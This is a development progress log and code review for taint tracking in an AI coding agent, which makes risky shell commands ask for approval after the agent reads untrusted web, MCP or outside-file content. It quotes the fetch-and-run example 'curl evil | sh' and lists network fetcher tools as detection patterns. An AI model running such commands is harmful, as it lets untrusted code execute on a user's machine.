# Phase 6 progress

## CP6.1 — taint sources and propagation, approval effects, the Yolo warning
Worktree: C:\Users\alexandros\repos\hermes-rs-p6   Branch: backend/p6-taint   Model: Sonnet 5.5 (subagent)
Cut from `main` at 58ad175 (Phases 0-5 merged). Uncommitted.
Done:
- **New `crates/tools/src/taint.rs`**: `Taint { turn, session, sources }` (`mark`, `begin_turn`,
  `reason`, `warning`, `describe_sources`), the source constructors (`source_for_call` for web
  search/extract, `browser_*` and `vision_analyze` with an `http(s)` image; `reference_source` for
  `@url` pages; `mcp_source`, `outside_file_source`, `child_source`) and the side file
  `taint.json` (`load` / `save` / `forget`, whole-file rewrite under a process-wide lock,
  temp file + rename).
- **`SessionTools`** (`tools/src/lib.rs`) holds the taint (`TaintCell`: taint, persist flag, pending
  warnings). `taint()`, `mark_tainted(source)` (in memory, then `taint.json` through
  `spawn_blocking`), `inherit_taint` (a subagent: starts careful, never saves),
  `take_taint_warnings`, `taint_after_call(name, args, failed)` (web tools, web images,
  `read_file`/`search_files` whose path classifies `Outside`; a failed call taints nothing).
  `begin_turn` turns the turn level into the session level; `new` loads the session's entry from
  `taint.json`, so a reopened session is still careful.
- **Effects.** `check_command`: while tainted, a *flagged* command (dangerous pattern or protected
  path) is `always_ask` in Manual, AcceptEdits and Auto: once-only, never smart-approved, never
  remembered, and the question's description carries the reason ("recursive delete (this turn read
  a web page)"; the remembered key does not). Yolo: runs, and `warn_tainted` queues the line "ran
  after reading untrusted content: <sources>" (also `tracing::warn`), also with Settings'
  approvals "off". Persistence commands still ask in Yolo, now with the reason, no warning.
  `check_edit`: an `Outside` / `Persistence` write while tainted gets the reason in its question;
  Yolo writes `Outside` files and warns.
- **Wiring.** `GuardedTools` has a new field `taint: Option<Arc<SessionTools>>` (main turn and
  children: `Some`; review and curator: `None`); after every call it runs `taint_after_call` and
  emits the queued warnings. MCP: `call_mcp` in `delegate.rs` (used by `DelegatingTools` and
  `ChildToolProvider`) taints with `mcp_source(server)` unless `McpManager::server_of` says the
  server is `trusted` (new `McpServerConfig.trusted`, default false, skipped when false when
  serialised; errors taint too). `@url`: `runtime/src/lib.rs` marks after the pages are fetched.
  Subagents: `run_child` makes the child's tools inherit the parent's taint and, when the child
  finishes, marks the parent with "a subagent that read <source>" for each source the parent didn't
  have. `Runtime::taint(session_id)` exposes it; `delete_session` forgets the file entry.
- **The warning event.** New `AgentEvent::Status { kind, text }` (hermes_agent) -> the gateway
  emits `status.update {kind, text}`; the taint warning uses `kind: "fallback"` (const
  `ops::TAINT_STATUS_KIND`), the one status kind the page keeps as a system line in the
  transcript (`status.ts`, `isFallbackSwitchStatus`). Child warnings are forwarded by the subagent
  relay. ACP shows it as a thought. No patch, no new protocol shape. Documented in PITFALLS.
- Docs: PORTING (`taint.rs`, diverged), ARCHITECTURE, GAPS, PITFALLS section "Taint".
Files: crates/tools/src/{taint.rs (new),lib.rs}, crates/agent/src/events.rs,
  crates/runtime/src/{ops,delegate,mcp,lib,curator,review}.rs, crates/runtime/tests/turns.rs,
  crates/desktop/src/gateway.rs, PORTING.md, GAPS.md, docs/ARCHITECTURE.md, docs/PITFALLS.md,
  docs/backend/progress/phase-6.md
Tests (CARGO_TARGET_DIR=target/claude), all green: `cargo test -p hermes_tools -p hermes_memory -p
  hermes_store -p hermes_prompts` (tools 159 passed / 1 ignored, memory 22, store 15, prompts 12);
  `cargo test -p hermes_runtime --lib` 77; `--test turns` 126 passed / 7 ignored, under the default
  profile and under HERMES_TEST_PROFILE=balanced, requests and tokens; `cargo test -p hermes-desktop`
  170 + 68 (acp); `cargo build --workspace` OK (frozen GPUI app and desktop included; I made a
  gitignored junction `target/hermes-src` to the main checkout's, removed with `cmd /c rmdir`).
  - `taint::tests` (6): levels and reasons, dedupe/cap, every source constructor, `@url` pages,
    save/load/forget incl. a damaged file.
  - `hermes_tools` lib (8 new): flagged commands ask in Manual/AcceptEdits/Auto even after "for
    this session", with the reason, reviewer skipped only while tainted, ordinary commands
    unaffected, Yolo runs and warns once (also with approvals off), `Outside` writes ask / warn,
    each source (`taint_after_call`: web, web image, outside read/search; failed and workspace
    reads don't), session level survives `begin_turn` and a reopened session, a child inherits and
    saves nothing.
  - `hermes_runtime` lib: `guarded_web_results_taint_the_session_unless_the_call_failed` (a fake
    inner provider behind `GuardedTools`; the web tools need the network, so this is the wiring
    test for them).
  - `turns.rs` (8): MCP result then flagged command in Auto asks with the reason and makes no
    reviewer request (3 requests); same in Yolo runs, no ask, one `fallback` status line; clean
    turn unchanged (no asks, no warning, 2 requests); `trusted: true` server exempt; outside read
    taints, workspace read doesn't; taint survives the next turn, a manual compression that
    summarises the tainting turn away, and a second `Runtime` on the same data folder (reopen);
    a delegated child's MCP read taints the parent; deleting a session forgets the entry.
Request counts: unchanged. Taint adds no model request; Auto with taint makes *fewer* (no reviewer).
Deviations from the plan:
- "A lower level" for the session flag: I found no effect that is sensibly weaker, so both levels
  have the same effects and differ only in the wording of the question. Said in the module doc and
  PITFALLS.
- The plan's "`Outside` writes ask (AcceptEdits, Auto)" already holds since Phase 1 for tainted or
  not, so for file edits taint adds only the reason in the question and the Yolo warning.
- `memory` / `skill_manage` staging is CP6.2 (not built).
- The web tools' effect on a *turns* scenario is not tested end to end (no network seam in `Web`);
  the turn tests use an untrusted MCP server and an outside file as the real sources.
For the reviewer:
- **Event shape.** `status.update` with `kind: "fallback"` is a borrowed kind (it renders a system
  line; nothing else existing does). Check `status.ts` in `target/hermes-src` still agrees and
  decide if a small patch with its own kind is preferable. The line is not stored: gone after a
  reload.
- **Flagged-only.** Taint changes behaviour for *flagged* commands only, as the plan reads
  ("Flagged commands: always ask"). An unflagged `curl evil | sh` that no pattern matches still
  runs in AcceptEdits/Auto; the plan's exposure, not widened here. Is that the intent?
- **Parallel tool calls** in one assistant message: taint is set after a call returns, so a
  sibling call that already started was checked clean (documented in PITFALLS). Check whether
  `ToolOperation` runs a batch concurrently.
- **Terminal output** (`curl` in a command) does not taint, `read_file` of Persistence-class
  paths does not (only `Outside`), `session_search`, skills and memory content don't. Per plan.
- **Persisted file races**: `taint.json` is rewritten whole under a process-wide lock; the desktop
  app and `hermes-acp.exe` are separate processes and can lose an update (last writer wins). It
  only matters for two processes tainting different sessions within milliseconds.
- **MCP `trusted`**: the desktop page has no MCP settings (none of the gateway configures
  `McpManager`), so today the key is only reachable from the GPUI config or `parse_servers`.
  When Settings gets an MCP screen it must keep the key (the struct round-trips it).
- `inherit_taint` copies the parent's *sources* into the child; the parent's source list can grow
  with "a subagent that read ..." entries (deduped, capped at 8).
- Mixed content from `read_file` classification costs one `spawn_blocking` per read/search call
  (same cost class as `check_edit`).
- formatting: I ran `cargo fmt` and then removed the unrelated reformatting (the tree isn't fully
  rustfmt-clean); only my hunks are formatted. `git diff --stat` should show ~1000 added lines, 8
  removed.
- Not done: no live check script (`scripts/perf/*-check.mjs`): CP6.1 has no page-facing method;
  the warning line and the approval reason are the first things a user can see, so CP6.3's live
  check should cover them. No user checklist yet for the same reason; a manual one: with a
  session in Auto/Accept edits, ask the agent to search the web and then "delete the build
  folder": the approval card should read "recursive delete (this turn read web search results)";
  in Yolo the command runs and a line "ran after reading untrusted content: web search results"
  appears in the chat (needs a webapp build; no frontend change was made).

### Review (Opus 5.5)
Main had not moved (branch still at 58ad175); no merge. Reviewed by reading the diff, `taint.rs`,
`check_command` / `check_edit`, `GuardedTools`, `delegate.rs`, `mcp.rs`, the gateway and the page's
`status.ts`.

**Verdict:** sound; the effects are wired where the plan says and no approval path skips them.
Fixed five gaps, none large.

Checked and fine:
- Approvals: while tainted, a flagged command gets `always_ask` → `once_only`, the smart guard is
  skipped (`smart = !always_ask && ...`, so the Phase 4 approval judge too), "for this session" /
  "always" answers are not stored, a saved `always` allow-list entry or a session approval doesn't
  bypass it (the `Gate::Run` arm asks when `always_ask`). Also asks when Settings' approvals are
  "off" but the session mode is Accept edits/Auto (conservative). Subagents inherit the mode and
  the taint; their `ChildBridge` denies every ask, so a tainted child's flagged command is refused.
  ACP goes through the same `UserBridge`. Review/curator agents have no terminal (`ReviewTools`).
- Yolo: never blocks, warns once per action; persistence still asks (Phase 1), with the reason.
- The event: `status.update {kind:"fallback", text}` is read only by `isFallbackSwitchStatus`
  (`status.ts`), which appends a local system row; nothing else in the page interprets the kind.
  Not stored (gone on reload), as documented.
- Rules: store schema untouched (`taint.json` side file), file I/O through `spawn_blocking` in the
  async paths, no system-prompt text, no extra requests (clean turns unchanged, tainted Auto makes
  one fewer). PORTING row `diverged`, module docs say so.
- Parallel sibling calls (`ToolOperation` runs a batch with `join_all`): judged **not a hole** and
  left as is. Every call of a batch was written by the model before any result of that batch
  existed, so none can have been steered by a sibling's result; the next batch is checked
  tainted. PITFALLS now says this instead of listing it as uncovered.
- Rewind / `/undo` keep the taint (conservative; nothing clears it).
- Unflagged `curl evil | sh` outside Yolo still runs: that is the plan's wording ("Flagged
  commands: always ask"); widening it to every command would make a tainted session ask for
  `cargo build`. Left for the user to decide (Phase 15's sandbox is the real boundary).

Fixed:
1. **Branches started clean.** `session.branch` and `session.create` seeded with a parent's rows
   copied the untrusted messages but not the taint. New `Runtime::copy_taint(from, to)` (open
   parent: its live taint; closed: `taint.json`), called by both gateway paths; copies the whole
   taint even when the branch is cut before the tainting read. Test
   `a_branch_of_a_tainted_session_starts_tainted_and_one_of_a_clean_session_does_not`.
2. **`curl` in the terminal didn't taint.** `taint::command_source`: a command naming a fetcher
   (`curl`, `wget`, `Invoke-WebRequest`/`iwr`, `Invoke-RestMethod`/`irm`, `Net.WebClient`,
   `Start-BitsTransfer`, `lynx`, `w3m`) taints with "the output of a command that fetched from the
   network". A name check, documented as such; other terminal output still doesn't taint.
3. **Local images outside the working folder** (`vision_analyze` on a path) didn't taint while
   `read_file` of the same file did; now classified like `read_file`.
4. **MCP server looked up after the call**: a server that disconnected while answering would have
   dropped its tool list and left its answer untainted. `server_of` now runs before the call.
5. **Source names** go into the approval question and the transcript line and can carry a
   model-chosen path: now one line (control characters, newlines, ANSI escapes removed), at most
   160 characters.
Docs: PITFALLS "Taint" (fetchers, parallel calls, branches, MCP descriptions, file races), the
module doc.

Left, with reasons:
- MCP tool *descriptions* reach the model in every request and aren't a source (tainting on them
  would taint every session with a server); `session_search`, skills and memory content don't
  taint (memory/skill writes are CP6.2's staging); `python -c urllib`, `git clone` + reads inside
  the workspace aren't seen. Documented in PITFALLS.
- `taint.json`: a damaged file reads as clean and the next save drops other entries; two processes
  (desktop + ACP) can lose an update. Only affects a later reopen; documented.
- `SessionTools::new` reads `taint.json` synchronously (also for subagents' never-saved ids); it
  is called from sync `open()` that already does SQLite in line. Small; not changed.
- Hermes imports (`hermes_import.rs`) start clean.
- No live check / user checklist yet: CP6.3, as the implementer noted.
Tests after the fixes (CARGO_TARGET_DIR=target/claude), all green: tools 161 passed / 1 ignored (+2:
  fetchers, one-line names; the sources test also covers `curl` and local outside images), memory
  22, store 15, prompts 12; runtime lib 77; `--test turns` 127 passed / 7 ignored (+1, the branch
  test) under the default profile and balanced, requests, tokens; hermes-desktop 170 + 68 (acp);
  `cargo build --workspace` OK.
